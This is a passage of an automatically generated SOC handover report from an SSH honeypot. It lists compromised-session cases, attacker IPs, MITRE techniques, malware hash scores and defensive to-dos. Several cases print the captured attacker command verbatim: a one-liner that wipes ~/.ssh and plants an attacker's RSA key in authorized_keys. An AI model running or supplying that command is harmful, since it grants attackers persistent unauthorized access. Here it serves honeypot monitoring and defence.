| `2026-04-03 21:17:08` | `cowrie.session.params` |
| `2026-04-03 21:17:08` | `cowrie.command.input` |
| `2026-04-03 21:17:08` | `cowrie.command.failed` |
| `2026-04-03 21:17:09` | `cowrie.log.closed` |
| `2026-04-03 21:17:10` | `cowrie.session.params` |
| `2026-04-03 21:17:10` | `cowrie.command.input` |
| `2026-04-03 21:17:10` | `cowrie.session.file_download` |
| `2026-04-03 21:17:10` | `cowrie.log.closed` |
| `2026-04-03 21:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b591b9882a

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:17 |
| **Last Seen** | 2026-04-03 21:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:17:14` | `cowrie.session.connect` |
| `2026-04-03 21:17:14` | `cowrie.client.version` |
| `2026-04-03 21:17:14` | `cowrie.client.kex` |
| `2026-04-03 21:17:15` | `cowrie.login.success` |
| `2026-04-03 21:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb4ffd88b73b

| Field | Detail |
|---|---|
| **Source IP** | `121.142.70[.]6` |
| **First Seen** | 2026-04-03 21:22 |
| **Last Seen** | 2026-04-03 21:23 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox MKGSO` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:22:01` | `cowrie.session.connect` |
| `2026-04-03 21:22:01` | `cowrie.telnet.option` |
| `2026-04-03 21:22:01` | `cowrie.login.success` |
| `2026-04-03 21:22:01` | `cowrie.session.params` |
| `2026-04-03 21:22:01` | `cowrie.command.input` |
| `2026-04-03 21:22:01` | `cowrie.command.input` |
| `2026-04-03 21:22:01` | `cowrie.command.failed` |
| `2026-04-03 21:22:01` | `cowrie.command.input` |
| `2026-04-03 21:22:01` | `cowrie.command.failed` |
| `2026-04-03 21:22:01` | `cowrie.command.input` |
| `2026-04-03 21:22:01` | `cowrie.command.input` |
| `2026-04-03 21:22:01` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.failed` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:02` | `cowrie.command.input` |
| `2026-04-03 21:22:03` | `cowrie.command.input` |
| `2026-04-03 21:22:03` | `cowrie.command.input` |
| `2026-04-03 21:22:03` | `cowrie.command.input` |
| `2026-04-03 21:22:03` | `cowrie.command.failed` |
| `2026-04-03 21:23:42` | `cowrie.log.closed` |
| `2026-04-03 21:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.70[.]6` to AbuseIPDB if not already reported
- [ ] Block `121.142.70[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5781c4c0928

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:33 |
| **Last Seen** | 2026-04-03 21:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:33:29` | `cowrie.session.connect` |
| `2026-04-03 21:33:29` | `cowrie.client.version` |
| `2026-04-03 21:33:29` | `cowrie.client.kex` |
| `2026-04-03 21:33:30` | `cowrie.login.success` |
| `2026-04-03 21:33:31` | `cowrie.session.params` |
| `2026-04-03 21:33:31` | `cowrie.command.input` |
| `2026-04-03 21:33:31` | `cowrie.command.failed` |
| `2026-04-03 21:33:31` | `cowrie.log.closed` |
| `2026-04-03 21:33:32` | `cowrie.session.params` |
| `2026-04-03 21:33:32` | `cowrie.command.input` |
| `2026-04-03 21:33:33` | `cowrie.session.file_download` |
| `2026-04-03 21:33:33` | `cowrie.log.closed` |
| `2026-04-03 21:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb11ae76302b

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:33 |
| **Last Seen** | 2026-04-03 21:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:33:36` | `cowrie.session.connect` |
| `2026-04-03 21:33:36` | `cowrie.client.version` |
| `2026-04-03 21:33:37` | `cowrie.client.kex` |
| `2026-04-03 21:33:38` | `cowrie.login.success` |
| `2026-04-03 21:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af2f25cc37b

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:49 |
| **Last Seen** | 2026-04-03 21:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:49:44` | `cowrie.session.connect` |
| `2026-04-03 21:49:44` | `cowrie.client.version` |
| `2026-04-03 21:49:44` | `cowrie.client.kex` |
| `2026-04-03 21:49:45` | `cowrie.login.success` |
| `2026-04-03 21:49:46` | `cowrie.session.params` |
| `2026-04-03 21:49:46` | `cowrie.command.input` |
| `2026-04-03 21:49:46` | `cowrie.command.failed` |
| `2026-04-03 21:49:46` | `cowrie.log.closed` |
| `2026-04-03 21:49:47` | `cowrie.session.params` |
| `2026-04-03 21:49:47` | `cowrie.command.input` |
| `2026-04-03 21:49:47` | `cowrie.session.file_download` |
| `2026-04-03 21:49:47` | `cowrie.log.closed` |
| `2026-04-03 21:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be2bbd069f5

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 21:49 |
| **Last Seen** | 2026-04-03 21:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:49:51` | `cowrie.session.connect` |
| `2026-04-03 21:49:51` | `cowrie.client.version` |
| `2026-04-03 21:49:52` | `cowrie.client.kex` |
| `2026-04-03 21:49:53` | `cowrie.login.success` |
| `2026-04-03 21:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21cf8a5f57b0

| Field | Detail |
|---|---|
| **Source IP** | `179.43.186[.]241` |
| **First Seen** | 2026-04-03 21:58 |
| **Last Seen** | 2026-04-03 21:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:58:45` | `cowrie.session.connect` |
| `2026-04-03 21:58:45` | `cowrie.client.version` |
| `2026-04-03 21:58:45` | `cowrie.client.kex` |
| `2026-04-03 21:58:45` | `cowrie.login.success` |
| `2026-04-03 21:58:46` | `cowrie.session.params` |
| `2026-04-03 21:58:46` | `cowrie.command.input` |
| `2026-04-03 21:58:46` | `cowrie.log.closed` |
| `2026-04-03 21:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.43.186[.]241` to AbuseIPDB if not already reported
- [ ] Block `179.43.186[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b87c0699d5

| Field | Detail |
|---|---|
| **Source IP** | `101.13.2[.]183` |
| **First Seen** | 2026-04-03 21:59 |
| **Last Seen** | 2026-04-03 22:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 21:59:57` | `cowrie.session.connect` |
| `2026-04-03 21:59:57` | `cowrie.client.version` |
| `2026-04-03 21:59:57` | `cowrie.client.kex` |
| `2026-04-03 21:59:59` | `cowrie.login.success` |
| `2026-04-03 22:00:00` | `cowrie.direct-tcpip.request` |
| `2026-04-03 22:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.2[.]183` to AbuseIPDB if not already reported
- [ ] Block `101.13.2[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef0faa44bf3

| Field | Detail |
|---|---|
| **Source IP** | `118.123.116[.]93` |
| **First Seen** | 2026-04-03 22:00 |
| **Last Seen** | 2026-04-03 22:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 22:00:06` | `cowrie.session.connect` |
| `2026-04-03 22:00:06` | `cowrie.client.version` |
| `2026-04-03 22:00:06` | `cowrie.client.kex` |
| `2026-04-03 22:00:08` | `cowrie.login.success` |
| `2026-04-03 22:00:09` | `cowrie.direct-tcpip.request` |
| `2026-04-03 22:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.123.116[.]93` to AbuseIPDB if not already reported
- [ ] Block `118.123.116[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a127e43d26be

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-04-03 22:01 |
| **Last Seen** | 2026-04-03 22:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 22:01:02` | `cowrie.session.connect` |
| `2026-04-03 22:01:02` | `cowrie.client.version` |
| `2026-04-03 22:01:03` | `cowrie.client.kex` |
| `2026-04-03 22:01:03` | `cowrie.login.success` |
| `2026-04-03 22:01:03` | `cowrie.session.params` |
| `2026-04-03 22:01:03` | `cowrie.command.input` |
| `2026-04-03 22:01:03` | `cowrie.command.failed` |
| `2026-04-03 22:01:04` | `cowrie.log.closed` |
| `2026-04-03 22:01:04` | `cowrie.session.params` |
| `2026-04-03 22:01:04` | `cowrie.command.input` |
| `2026-04-03 22:01:04` | `cowrie.session.file_download` |
| `2026-04-03 22:01:04` | `cowrie.log.closed` |
| `2026-04-03 22:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83afc7ac044

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-04-03 22:01 |
| **Last Seen** | 2026-04-03 22:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 22:01:06` | `cowrie.session.connect` |
| `2026-04-03 22:01:06` | `cowrie.client.version` |
| `2026-04-03 22:01:06` | `cowrie.client.kex` |
| `2026-04-03 22:01:07` | `cowrie.login.success` |
| `2026-04-03 22:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `186.251.71[.]202` | **16** | 2026-04-03 20:35 | 2026-04-03 21:49 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.34[.]157` | **4** | 2026-04-03 20:35 | 2026-04-03 20:42 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `51.68.226[.]87` | **3** | 2026-04-03 21:57 | 2026-04-03 22:01 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `115.165.40[.]167` | 1 | 2026-04-03 21:02 | 2026-04-03 21:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.109.110[.]164` | 1 | 2026-04-03 22:15 | 2026-04-03 22:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-04-03 21:55 | 2026-04-03 21:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.129.245[.]249` | 1 | 2026-04-03 21:26 | 2026-04-03 21:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.252.234[.]206` | 1 | 2026-04-03 20:52 | 2026-04-03 20:53 | 31s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]106` | 1 | 2026-04-03 22:15 | 2026-04-03 22:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]58` | 1 | 2026-04-03 22:19 | 2026-04-03 22:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.104[.]208` | 1 | 2026-04-03 21:02 | 2026-04-03 21:02 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.149.113[.]86` | 1 | 2026-04-03 20:33 | 2026-04-03 20:33 | 4s | 0 | `T1592` | 🟢 LOW |
| `217.149.191[.]246` | 1 | 2026-04-03 21:11 | 2026-04-03 21:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.150.37[.]249` | 1 | 2026-04-03 22:08 | 2026-04-03 22:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.75.185[.]101` | 1 | 2026-04-03 20:43 | 2026-04-03 20:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.41.81[.]65` | 1 | 2026-04-03 21:40 | 2026-04-03 21:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.163[.]103` | 1 | 2026-04-03 21:30 | 2026-04-03 21:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.192.139[.]7` | 1 | 2026-04-03 20:43 | 2026-04-03 20:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-04-03 20:52 | 2026-04-03 20:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.229.46[.]153` | 1 | 2026-04-03 22:18 | 2026-04-03 22:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `24.75.185[.]101` | CA | Cogeco Connexion inc | **100** ⚠️ | 11 |
| `65.20.163[.]103` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 22 |
| `31.41.81[.]65` | PL | Telekom System sp.z o.o. | **100** ⚠️ | 50 |
| `217.149.191[.]246` | RU | JSC RDE Unico | **100** ⚠️ | 8 |
| `190.149.113[.]86` | GT | Telgua | **100** ⚠️ | 7 |
| `101.13.2[.]183` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 27 |
| `120.48.147[.]81` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `123.129.245[.]249` | CN | China Unicom Shandong Province Network | **100** ⚠️ | 50 |
| `85.229.46[.]153` | SE | Telenor Sverige AB | **100** ⚠️ | 27 |
| `123.252.234[.]206` | IN | Tata Teleservices Maharashtra Ltd | **100** ⚠️ | 15 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 60 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 35 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 4 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 74 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 24 priority case(s) shown individually · 20 recon entry/entries in table (3 group(s) consolidating 23 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-03T22:31:23Z_
